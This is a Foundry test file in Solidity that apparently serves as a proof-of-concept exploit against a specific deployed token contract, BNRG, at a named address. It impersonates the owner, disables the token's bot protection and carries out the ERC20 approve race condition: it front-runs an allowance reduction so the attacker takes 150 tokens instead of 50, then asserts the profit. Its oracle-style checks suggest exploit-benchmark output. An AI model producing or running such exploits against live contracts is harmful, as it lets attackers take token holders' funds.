// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface BNRG {
    enum State { Locked, Restricted, Unlocked }

    function owner() external view returns (address);
    function approve(address delegate, uint256 numTokens) external returns (bool);
    function allowance(address owner, address delegate) external view returns (uint256);
    function transferFrom(address owner, address receiver, uint256 numTokens) external returns (bool);
    function balanceOf(address tokenOwner) external view returns (uint256);
    function setBotProtection(bool enable) external;
    function state() external view returns (State);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: ensure contract is not in Locked state
        address owner = BNRG(TARGET).owner();

        // Impersonate owner to set state to Unlocked
        vm.startPrank(owner);
        BNRG(TARGET).setBotProtection(false); // This sets state to Unlocked
        vm.stopPrank();

        // Verify state is not Locked
        require(BNRG(TARGET).state() != BNRG.State.Locked, "Contract is locked");

        // Get some initial tokens to the attacker for gas or testing
        // Not needed for approve race exploit

        // Label addresses for clarity
        vm.label(owner, "Owner/Victim");
        vm.label(TARGET, "BNRG Token");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialERC20Balance = IERC20(0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C).balanceOf(address(this));
        // Step 1: Get initial approval from victim (owner) for 100 tokens
        address owner = BNRG(TARGET).owner();

        // Impersonate owner to approve attacker for 100 tokens
        vm.prank(owner);
        BNRG(TARGET).approve(attacker, 100 * 10**18);

        // Verify initial allowance
        uint256 initialAllowance = BNRG(TARGET).allowance(owner, attacker);
        require(initialAllowance == 100 * 10**18, "Initial approval failed");

        // Record attacker's initial balance
        uint256 initialBalance = BNRG(TARGET).balanceOf(attacker);

        // Step 2: Simulate victim trying to reduce approval to 50 tokens
        // In real scenario, we'd monitor mempool and front-run
        // Here we simulate by creating the reduction transaction
        bytes memory reductionCall = abi.encodeWithSignature(
            "approve(address,uint256)",
            attacker,
            50 * 10**18
        );

        // Step 3: Front-run the reduction with transferFrom for 100 tokens
        // We execute transferFrom before the reduction
        BNRG(TARGET).transferFrom(owner, attacker, 100 * 10**18);

        // Step 4: Now execute the reduction (simulating victim's transaction)
        vm.prank(owner);
        BNRG(TARGET).approve(attacker, 50 * 10**18);

        // Step 5: Transfer another 50 tokens using the new allowance
        BNRG(TARGET).transferFrom(owner, attacker, 50 * 10**18);

        // Final verification
        uint256 finalBalance = BNRG(TARGET).balanceOf(attacker);
        uint256 profit = finalBalance - initialBalance;

        // We should have gained 150 tokens
        require(profit == 150 * 10**18, "Exploit failed: incorrect profit amount");

        // Oracle check will verify attacker balance increased
        console.log("Initial balance:", initialBalance);
        console.log("Final balance:", finalBalance);
        console.log("Profit:", profit);
        uint256 finalERC20Balance = IERC20(0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C).balanceOf(address(this));
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

